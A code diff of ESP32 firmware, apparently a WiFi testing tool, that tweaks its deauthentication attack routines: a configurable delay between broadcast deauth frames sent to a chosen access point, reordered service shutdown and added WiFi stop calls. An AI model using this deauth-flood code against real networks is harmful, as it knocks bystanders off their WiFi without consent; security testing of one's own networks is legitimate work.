@@ -17,8 +17,8 @@
 #include "managers/settings_manager.h"
 
 
-uint16_t ap_count = 0;
-wifi_ap_record_t* scanned_aps = NULL;
+uint16_t ap_count;
+wifi_ap_record_t* scanned_aps;
 const char *TAG = "WiFiManager";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
@@ -499,7 +499,7 @@ void wifi_deauth_task(void *param) {
             {
                 uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                 wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
-                vTaskDelay(10 / portTICK_PERIOD_MS);
+                vTaskDelay(settings_get_broadcast_speed(G_Settings) / portTICK_PERIOD_MS);
             }
         }
         else 
@@ -522,11 +522,11 @@ void wifi_manager_start_deauth()
 {
     if (!beacon_task_running) {
         ESP_LOGI(TAG, "Starting deauth transmission...");
-        esp_wifi_start();
+        ap_manager_stop_services();
+        ESP_ERROR_CHECK(esp_wifi_start());
         xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
-        ap_manager_stop_services();
     } else {
         ESP_LOGW(TAG, "Deauth transmission already running.");
     }
@@ -626,7 +626,7 @@ void wifi_manager_auto_deauth()
 {
     ESP_LOGI(TAG, "Starting auto deauth transmission...");
     wifi_auto_deauth_task(NULL);
-}
+}               
 
 
 void wifi_manager_stop_deauth()
@@ -638,6 +638,7 @@ void wifi_manager_stop_deauth()
             deauth_task_handle = NULL;
             beacon_task_running = false;
             rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
+            esp_wifi_stop();
             ESP_ERROR_CHECK(ap_manager_start_services());
         }
     } else {
